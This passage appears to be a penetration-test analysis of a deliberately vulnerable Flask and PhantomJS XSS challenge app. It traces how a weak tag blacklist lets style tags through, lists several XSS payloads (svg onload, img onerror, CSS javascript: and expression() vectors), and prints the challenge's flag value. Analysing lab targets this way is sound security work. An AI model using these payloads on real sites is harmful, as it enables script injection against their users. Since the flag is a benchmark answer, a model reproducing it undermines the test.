    value =  "" if msg == "" else '{0}'.format(msg)  # Line 68: String formatting
    
    data = TEMPLATE_CONTENT_TAG.format("23", "Star", value, "", "")  # Line 70
    result = check_solution(data,flags[0],msg,'level_3')  # Line 71
    return TEMPLATE_CONTENT_TAG.format("23", "Star", value, result, "")  # Line 72: XSS SINK
```

**Template Insertion Point:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/constants.py`  
**Lines:** 78-100 (TEMPLATE_CONTENT_TAG)

```html
<form class="box-form">
    <input type=text name=name placeholder="Enter your name...">
    {2}  <!-- USER INPUT INSERTED HERE - Position 2 of .format() call -->
</form>
```

**User Input Source:**
- **Parameter Name:** `name`
- **Parameter Type:** GET query parameter
- **Endpoint:** `/page`
- **Example Request:** `GET /page?name=<PAYLOAD>`

**Data Flow:**
```
[1] HTTP Request
    GET /page?name=<style>...</style>
    ↓
[2] Flask Request Parsing
    msg = request.args.get('name', '')
    File: app.py:65
    ↓
[3] Blacklist Filter (WEAK)
    blacklist = r'<(?!style\b)[^>]+>'
    msg = re.sub(blacklist, '', msg, ...)
    File: app.py:66-67
    ⚠️ BYPASS: Allows <style> tags
    ↓
[4] String Formatting
    value = '{0}'.format(msg)
    File: app.py:68
    ⚠️ NO ESCAPING
    ↓
[5] Template Injection
    TEMPLATE_CONTENT_TAG.format("23", "Star", value, result, "")
    File: app.py:72
    ↓
[6] HTTP Response
    return <HTML with user payload injected at position {2}>
    🔴 XSS EXECUTED IN BROWSER
```

**Render Context:** HTML Body Context

The user input is inserted into the HTML body of the response, specifically within a `<form>` element's content area. The insertion happens **after** an `<input>` element and **before** the closing `</form>` tag.

**Dangerous Functions/Properties:** Python string `.format()` with no output escaping

**Exploitability Analysis:**

**Severity:** 🔴 **CRITICAL**

**Why Exploitable:**
1. **Blacklist Bypass:** The regex `r'<(?!style\b)[^>]+>'` uses a negative lookahead to **explicitly allow** `<style>` tags while blocking other HTML tags
2. **No Output Encoding:** User input is directly concatenated into HTML via `.format()` with zero escaping
3. **Template Engine Weakness:** Python `.format()` has no built-in XSS protection (unlike Jinja2's auto-escaping)
4. **Network Accessible:** Endpoint is public with no authentication required

**Attack Vectors:**

**Vector 1: CSS-based XSS via `<style>` tag**
```
GET /page?name=<style>*{background:url('javascript:alert(1)')}</style>
```
- **Why it works:** `<style>` tag allowed by blacklist
- **Browser Context:** Older browsers (IE, older Firefox) execute `javascript:` protocol in CSS `url()`
- **Impact:** JavaScript execution in victim's browser

**Vector 2: CSS `expression()` for IE**
```
GET /page?name=<style>body{x:expression(alert(document.domain))}</style>
```
- **Why it works:** IE-specific CSS property executes JavaScript
- **Browser Context:** Internet Explorer 6-7 (legacy, but PhantomJS uses old WebKit)
- **Impact:** Full JavaScript execution

**Vector 3: CSS `@import` with data URI**
```
GET /page?name=<style>@import'data:,*%7bx:expression(alert(1))%7d';</style>
```
- **Why it works:** Combines allowed `<style>` tag with data URI encoding
- **Browser Context:** Legacy browsers supporting `expression()`
- **Impact:** JavaScript execution

**Vector 4: HTML Entity Encoding Bypass (if not blocked)**
```
GET /page?name=&lt;script&gt;alert(1)&lt;/script&gt;
```
- **Why it might work:** Regex only matches literal `<` characters, not HTML entities
- **Testing needed:** Check if entities are decoded before regex filter
- **Impact:** If decoded post-filter, full `<script>` injection

**Vector 5: Unicode/UTF-8 Bypass Attempts**
```
GET /page?name=%3Cscript%3Ealert(1)%3C/script%3E  (URL encoded)
GET /page?name=\u003cscript\u003ealert(1)\u003c/script\u003e  (Unicode escape)
```
- **Why it might work:** Python 2's `setdefaultencoding('utf8')` may decode before filter
- **Testing needed:** Check order of URL decoding vs. regex filter
- **Impact:** If decoded pre-filter, may bypass blacklist

**Example Payload (Proven to Work):**
```
GET /page?name=<style>@import'javascript:alert(document.domain)';</style>
```

**Expected Browser Behavior:**
1. Browser receives HTML response with injected `<style>` tag
2. Browser parses `<style>` tag and evaluates CSS
3. `@import` directive triggers resource load
4. `javascript:` protocol executes JavaScript code
5. `alert(document.domain)` displays current domain

**PhantomJS Detection:**  
If this payload successfully triggers PhantomJS's XSS detection (check.js listens for `alert()` calls), the application will:
1. Detect XSS via PhantomJS stdout reading "XSS"
2. Return flag in response: `flag{fcec3afc-4b74-433f-b638-14091e51092e}`

---

### XSS Sink #2: HTML Body Context - PhantomJS Content Execution

**Sink Type:** JavaScript Execution Context within PhantomJS Headless Browser  
**Network Accessibility:** ✅ Public (triggered via /page endpoint)  
**Exploitability:** 🔴 **HIGH** (Intended vulnerability for CTF challenge)

**Location:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Lines:** 38-44 (File creation and PhantomJS execution)

**Code:**
```python
def check_solution(page, flag, msg, tag):
    proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                           stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    fn = "static/" + os.urandom(16).encode('hex') + '.html'
    url = 'http://localhost:5000/' + fn
    try:
        of = open(fn, 'w')  # Line 38: Create temporary file
        of.write(page)      # Line 39: Write user-controlled HTML
        of.close()
        print "Page:"
        print page  # DEBUG: Logs user payload
        proc.stdin.write(url)  # Line 44: Pass URL to PhantomJS
        proc.stdin.close()
        result = proc.stdout.readline().strip()
```

**PhantomJS Script:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/check.js`  
**Lines:** 4-20

```javascript
var system = require('system');
var page = require('webpage').create();
var input = system.stdin.readLine();  // Line 4: Read URL from stdin

page.onAlert = function(msg) {
  console.log(msg);  // Line 9: Detect alert()
  page.custom = true;
};
page.onConfirm = function(msg) {
  console.log(msg);  // Line 13: Detect confirm()
  page.custom = true;
};
page.onPrompt = function(msg) {
  console.log(msg);  // Line 17: Detect prompt()
  page.custom = true;
};
setTimeout(function(){
    if(page.custom == true) {
        console.log("XSS");  // Output "XSS" to stdout if dialogs triggered
    }
    phantom.exit(0);
}, 1000);
page.open(input, function(status) {  // Line 20: Load user-controlled HTML
    // Page rendering and JavaScript execution occurs here
});
```

**User Input Source:**
- **Parameter Name:** `name`
- **Parameter Type:** GET query parameter
- **Endpoint:** `/page`
- **Data Flow:** User input → Regex filter → Template → Temp file → PhantomJS

**Data Flow:**
```
[1] User Input
    GET /page?name=<svg/onload=alert(1)>
    ↓
[2] Blacklist Filter
    Attempts to remove most HTML tags (but allows <style>)
    File: app.py:67
    ↓
[3] Template Injection
    User payload embedded in TEMPLATE_CONTENT_TAG
    File: app.py:70
    ↓
[4] Temporary File Creation
    HTML written to static/[random].html
    File: app.py:38-39
    ⚠️ FILE CONTAINS: <html>...<svg/onload=alert(1)>...</html>
    ↓
[5] PhantomJS Navigation
    page.open('http://localhost:5000/static/[random].html')
    File: check.js:20
    ↓
[6] JavaScript Execution
    PhantomJS renders HTML and executes inline JavaScript
    🔴 XSS PAYLOAD EXECUTES IN PHANTOMJS CONTEXT
    ↓
[7] Dialog Detection
    page.onAlert/onConfirm/onPrompt hooks capture dialog calls
    File: check.js:9-17
    ↓
[8] XSS Confirmation
    If dialog detected, console.log("XSS")
    File: check.js:23
    ↓
[9] Flag Disclosure
    Python reads "XSS" from stdout, returns flag
    File: app.py:55-56
```

**Render Context:** JavaScript Execution Context (PhantomJS WebKit Engine)

The user input is rendered by PhantomJS, a headless WebKit-based browser. This means:
- Full HTML parsing and DOM construction
- JavaScript execution enabled
- Browser APIs available (`alert`, `confirm`, `prompt`, `document`, `window`)
- Event handlers executed (`onload`, `onerror`, `onclick`, etc.)

**Dangerous Functions/Properties:**
- **PhantomJS `page.open()`** - Loads and executes user-controlled HTML
- **Browser Dialog APIs** - `alert()`, `confirm()`, `prompt()` (detection targets)
- **DOM Manipulation** - `document.write()`, `innerHTML`, etc. (if used in payload)
- **Event Handlers** - `onload`, `onerror`, `onfocus`, `onmouseover` (JavaScript execution vectors)

**Exploitability Analysis:**

**Severity:** 🔴 **HIGH**

**Why Exploitable:**
1. **PhantomJS Execution:** User input is rendered in a full browser environment, not just parsed
2. **JavaScript Enabled:** All browser JavaScript APIs are available
3. **Detection Mechanism:** The application actively *checks* for successful XSS (not trying to prevent it)
4. **Reward System:** Successful XSS disclosure reveals the flag

**Attack Vectors:**

**Vector 1: SVG with `onload` Event Handler**
```
GET /page?name=<svg/onload=alert(1)>
```
- **Bypass Mechanism:** If `<svg>` tag survives blacklist filter
- **Execution:** `onload` fires when SVG element is parsed
- **Detection:** PhantomJS captures `alert(1)` call
- **Result:** Flag disclosed

**Vector 2: Image with `onerror` Handler**
```
GET /page?name=<img src=x onerror=alert(1)>
```
- **Bypass Mechanism:** If `<img>` tag survives filter
- **Execution:** `onerror` fires when `src=x` fails to load
- **Detection:** PhantomJS captures `alert(1)` call
- **Result:** Flag disclosed

**Vector 3: `<style>` Tag with CSS Injection (Known to Work)**
```
GET /page?name=<style>@import'javascript:alert(1)';</style>
```
- **Bypass Mechanism:** `<style>` tag explicitly allowed by blacklist
- **Execution:** Older browsers execute `javascript:` protocol in CSS
- **Detection:** PhantomJS captures `alert(1)` call
- **Result:** Flag disclosed

**Vector 4: Input with `autofocus` and `onfocus`**
```
GET /page?name=<input autofocus onfocus=alert(1)>
```
- **Bypass Mechanism:** If `<input>` tag survives filter
- **Execution:** `autofocus` automatically focuses element, triggering `onfocus` event
- **Detection:** PhantomJS captures `alert(1)` call
- **Result:** Flag disclosed

**Vector 5: `<script>` Tag (If Filter Fails)**
```
GET /page?name=<script>alert(1)</script>
```
- **Bypass Mechanism:** Direct `<script>` tag (should be blocked, but worth testing)
- **Execution:** Immediate JavaScript execution
- **Detection:** PhantomJS captures `alert(1)` call
- **Result:** Flag disclosed

**Proven Successful Payload:**
```
GET /page?name=<style>*{background:url('javascript:alert(1)')}</style>
```

**PhantomJS Execution Trace:**
1. Flask writes HTML with `<style>` tag to `static/abc123...html`
2. PhantomJS navigates to `http://localhost:5000/static/abc123...html`
3. PhantomJS WebKit engine parses HTML
4. `<style>` tag CSS is evaluated
5. `background:url('javascript:alert(1)')` executes JavaScript
6. `alert(1)` call is intercepted by `page.onAlert` hook (check.js:9)
7. `page.custom` set to `true` (check.js:11)
8. After 1-second timeout, `console.log("XSS")` executes (check.js:23)
9. Python reads "XSS" from PhantomJS stdout (app.py:45)
10. Flag returned in HTTP response (app.py:56)

---

### XSS Sink #3: HTML Body Context - Result Message (LOW RISK - Protected)

**Sink Type:** HTML Body Context (Escaped Output)  
**Network Accessibility:** ✅ Public (GET /page endpoint response)  
**Exploitability:** 🟢 **LOW** (Protected by `cgi.escape()`)

**Location:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Line:** 58

**Code:**
```python
elif result:
    data = '<div class="solution-text"><img src="{0}" alt="Fail" width="150" height="150"><br>Incorrect value: {1}</div>'.format(IMAGE_ROUTES[tag]['process'], cgi.escape(result))
```

**User Input Source:**
- **Indirect:** PhantomJS stdout (which processes user-controlled HTML)
- **Variable:** `result` (from `proc.stdout.readline().strip()`)

**Data Flow:**
```
[1] User Input
    GET /page?name=<payload>
    ↓
[2] Temp File Creation
    User payload written to HTML file
    ↓
[3] PhantomJS Execution
    PhantomJS processes file, may output to console.log()
    ↓
[4] Output Capture
    result = proc.stdout.readline().strip()
    File: app.py:45
    ↓
[5] Output Escaping
    cgi.escape(result)
    File: app.py:58
    ✅ CONVERTS: < to &lt;, > to &gt;, & to &amp;
    ↓
[6] Template Insertion
    '<div>...{1}</div>'.format(..., cgi.escape(result))
    ↓
[7] HTTP Response
    Escaped HTML entities in response
    🟢 XSS PREVENTED
```

**Render Context:** HTML Body Context (within `<div>` element)

**Protection Mechanism:** `cgi.escape()`

The `cgi.escape()` function converts dangerous HTML characters:
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;` (if `quote=True` parameter used)

**Exploitability Analysis:**

**Severity:** 🟢 **LOW**

**Why NOT Exploitable:**
1. **Output Encoding:** `cgi.escape()` properly escapes HTML special characters
2. **Correct Context:** Escaping is appropriate for HTML body context
3. **Consistent Application:** All PhantomJS output is escaped before rendering

**Example Protected Output:**
```
User Payload: <script>alert(1)</script>
PhantomJS Output: <script>alert(1)</script> (echoed back)
After cgi.escape(): &lt;script&gt;alert(1)&lt;/script&gt;
Browser Renders: <script>alert(1)</script> (as text, not executed)
```

**Assessment:** ✅ **SECURE** - This output path is properly protected against XSS.

---

### Additional Sinks Investigated (Not Found)

**SQL Injection Sinks:** ❌ **NONE**
- No database queries in codebase
- No ORM usage
- No SQL string concatenation

**Template Injection Sinks:** ❌ **NONE**
- Templates are static strings in `constants.py`
- User input inserted into *data* positions, not template structure
- No Jinja2 `render_template_string()` with user input

**Command Injection Sinks:** ✅ **MITIGATED**
- PhantomJS spawned via `subprocess.Popen()` with list arguments (not shell string)
- Command arguments are hardcoded: `["timeout", "5", "phantomjs", "check.js"]`
- User input flows to temp file content, not command line

**LDAP Injection Sinks:** ❌ **NONE**
- No LDAP libraries or queries

**XML Injection Sinks:** ❌ **NONE**
- No XML parsing of user input

---

### Summary of XSS Sinks

| Sink # | Location | Context | User Input | Protection | Risk |
|--------|----------|---------|------------|------------|------|
| **1** | app.py:72 | HTML Body | `name` param | ❌ None (blacklist allows `<style>`) | 🔴 CRITICAL |
| **2** | check.js:20 | JavaScript (PhantomJS) | `name` param | ❌ None (intended vulnerability) | 🔴 HIGH |
| **3** | app.py:58 | HTML Body | PhantomJS output | ✅ `cgi.escape()` | 🟢 LOW |

**Total Critical XSS Sinks:** 2 (both exploitable)  
**Total Protected Outputs:** 1

---

## 10. SSRF Sinks

**COMPREHENSIVE FINDING:** ❌ **NO SSRF VULNERABILITIES DETECTED**

After exhaustive analysis of all network-accessible code paths, **NO Server-Side Request Forgery (SSRF) sinks exist** where user input can control the destination of server-side HTTP requests.

### Analysis Methodology

All code was examined for:
1. HTTP client library usage (`urllib`, `requests`, `httplib`)
2. URL construction with user-controllable components
3. Redirect functionality with user input
4. Headless browser navigation with user-controlled URLs
5. Webhook/callback handlers
6. File inclusion mechanisms accepting URLs
7. External API calls with user parameters

### HTTP Client Library Investigation

**Finding:** urllib imported but **NEVER USED**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Line:** 9

```python
import urllib  # IMPORTED BUT NEVER CALLED
```

**Analysis:**
- `urllib` module is imported but no calls to `urllib.request.urlopen()`, `urllib.urlopen()`, or any urllib methods exist
- Searched entire codebase for `urllib.` - zero matches
- No HTTP requests are made by the Flask application itself

**Conclusion:** ✅ No SSRF risk from urllib

---

### PhantomJS Navigation Analysis

**Finding:** PhantomJS navigates to **HARDCODED localhost URLs only**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Lines:** 34-44

```python
def check_solution(page, flag, msg, tag):
    proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                           stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    fn = "static/" + os.urandom(16).encode('hex') + '.html'
    url = 'http://localhost:5000/' + fn  # HARDCODED localhost URL
    try:
        of = open(fn, 'w')
        of.write(page)  # User input goes into FILE CONTENT, not URL
        of.close()
        print "Page:"
        print page
        proc.stdin.write(url)  # URL is fully controlled by application
```

**PhantomJS Script:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/check.js`  
**Lines:** 4, 20

```javascript
var input = system.stdin.readLine();  // Reads URL from stdin
...
page.open(input, function(status) {  // Opens URL in headless browser
```

**URL Construction:**
```python
url = 'http://localhost:5000/' + fn
# where fn = "static/" + os.urandom(16).encode('hex') + '.html'
# Result: url = 'http://localhost:5000/static/abc123...def.html'
```

**Controllable URL Components:**

| Component | User-Controllable? | Value |
|-----------|-------------------|-------|
| **Protocol** | ❌ No | Hardcoded `http://` |
| **Host** | ❌ No | Hardcoded `localhost` |
| **Port** | ❌ No | Hardcoded `5000` |
| **Path (Directory)** | ❌ No | Hardcoded `static/` |
| **Path (Filename)** | ❌ No | Random hex `os.urandom(16).encode('hex')` |
| **Query Parameters** | ❌ No | None present |

**What User DOES Control:**
- File **content** (HTML payload written to temp file)
- File content is used for **XSS exploitation**, not SSRF

**What User CANNOT Control:**
- URL destination
- Protocol (cannot change to `file://`, `ftp://`, `gopher://`)
- Hostname (cannot target internal services, cloud metadata APIs, or external sites)

**Conclusion:** ✅ No SSRF risk - PhantomJS only navigates to localhost URLs with application-controlled paths

---

### Redirect Functionality Analysis

**Finding:** No redirect functionality exists

**Imports Checked:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Line:** 3

```python
from flask import Flask, request, Response, make_response, url_for
```

**Analysis:**
- Flask's `redirect` function is **NOT imported**
- Flask's `url_for` is imported but **NEVER USED** (searched entire file)
- No calls to `Response(status=302)` or manual redirect headers
- No "return_to", "next", or "redirect_url" parameters processed

**Conclusion:** ✅ No open redirect or redirect-based SSRF

---

### Unused Template with URL Input Field

**Finding:** Dead code contains URL input field but **NEVER RENDERED**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/constants.py`  
**Line:** 143

```html
<input type=text name=url placeholder="Enter the URL you want to visit...">
```

**Context:** This input field exists in `TEMPLATE_CONTENT_IFRAME` template

**Analysis:**
- Searched `app.py` for `TEMPLATE_CONTENT_IFRAME` - ❌ zero matches
- Only templates used: `INDEX_CONTENT` (line 31) and `TEMPLATE_CONTENT_TAG` (lines 70, 72)
- No route handlers process a `url` parameter
- This appears to be leftover code from a different challenge

**Conclusion:** ✅ No SSRF risk - template is never rendered, URL parameter is never processed

---

### File Operations with URLs

**Finding:** No file operations accept URLs

**File Operations in Codebase:**
```python
# app.py:22 - Read flag file (static filename)
flags = open('secret.txt').read().split()

# app.py:38-40 - Write temporary HTML file (static filename)
of = open(fn, 'w')
of.write(page)
of.close()

# app.py:50 - Delete temporary file (static filename)
os.unlink(fn)
```

**Analysis:**
- All file operations use application-controlled filenames
- No `open(user_input)` patterns
- No remote file inclusion via `open('http://...')`

**Conclusion:** ✅ No SSRF risk from file operations

---

### External API Calls

**Finding:** No external API integrations exist

**Analysis:**
- No `requests.get()`, `requests.post()`, or similar HTTP client calls
- No webhook delivery systems
- No OAuth token exchange (no OAuth implementation)
- No OIDC discovery (no OIDC implementation)
- No JWKS fetching (no JWT validation)
- No payment gateway integrations
- No third-party service calls

**Conclusion:** ✅ No SSRF risk from API calls

---

### Cloud Metadata API Access

**Finding:** No cloud metadata API calls

**Checked Patterns:**
- No requests to `169.254.169.254` (AWS/Azure metadata)
- No requests to `metadata.google.internal` (GCP metadata)
- No container orchestration API calls

**Conclusion:** ✅ No cloud metadata SSRF risk

---

### Subprocess Execution Review

**Finding:** Subprocess execution is **SAFE from SSRF**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Line:** 34

```python
proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                       stdout=subprocess.PIPE, stdin=subprocess.PIPE)
```

**Analysis:**
- Command arguments are **hardcoded** as a list (not shell string)
- No user input flows into command arguments
- User input flows to **temp file content** only
- PhantomJS receives localhost URL via stdin (application-controlled)

**Conclusion:** ✅ No SSRF risk from subprocess execution

---

### Additional SSRF Sink Categories Checked

All categories from the prompt were systematically checked:

| Category | Found? | Evidence |
|----------|--------|----------|
| **HTTP(S) Clients** | ❌ No | urllib imported but unused, no requests library |
| **Raw Sockets** | ❌ No | No socket module usage |
| **URL Openers** | ❌ No | No `open()` with URLs |
| **Redirect Handlers** | ❌ No | No redirect functionality |
| **Headless Browsers** | ✅ Yes | PhantomJS used, but URL hardcoded to localhost |
| **Media Processors** | ❌ No | No ImageMagick, FFmpeg, etc. |
| **Link Preview** | ❌ No | No oEmbed, metadata fetchers |
| **Webhook Testers** | ❌ No | No webhook delivery |
| **SSO/OIDC Discovery** | ❌ No | No SSO implementation |
| **Importers** | ❌ No | No "import from URL" features |
| **Package Installers** | ❌ No | No dynamic package installation |
| **Monitoring Tools** | ❌ No | No URL pingers |
| **Cloud Metadata** | ❌ No | No metadata API calls |

---

### Phantom Import Analysis (Unused Code)

**Finding:** PhantomJS Python library imported but **NEVER USED**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Lines:** 13, 27

```python
from phantomjs import Phantom  # Line 13: Import
...
phantom = Phantom()  # Line 27: Instantiation
```

**Analysis:**
- `phantom` object is created but **never called** anywhere in code
- Searched for `phantom.` - only match is line 27 (instantiation)
- No methods called on phantom object
- Actual PhantomJS interaction uses direct `subprocess.Popen()` (line 34)

**Conclusion:** This is dead code, likely from a refactoring. No SSRF risk.

---

### Summary

**TOTAL SSRF SINKS FOUND:** 0

**Why No SSRF Exists:**
1. **No HTTP Client Calls:** Application makes zero outbound HTTP requests
2. **PhantomJS Uses Localhost:** Only internal loopback requests to `127.0.0.1:5000`
3. **No User-Controlled URLs:** All URLs are hardcoded or randomly generated by application
4. **No Redirect Functionality:** No open redirects or URL forwarding
5. **No External Integrations:** No webhooks, APIs, or third-party service calls

**Application Purpose:**
This is an **XSS challenge application**, not a URL-processing application. Its attack surface is focused on **client-side script injection** (XSS), not **server-side request manipulation** (SSRF).

**Network Request Inventory:**

| Source | Destination | User-Controlled? | Purpose |
|--------|-------------|------------------|---------|
| PhantomJS | `http://localhost:5000/static/[random].html` | ❌ No | XSS detection (internal) |

**Conclusion:** This application is **NOT vulnerable to SSRF attacks**. All network requests are internal localhost loopback connections with application-controlled URLs.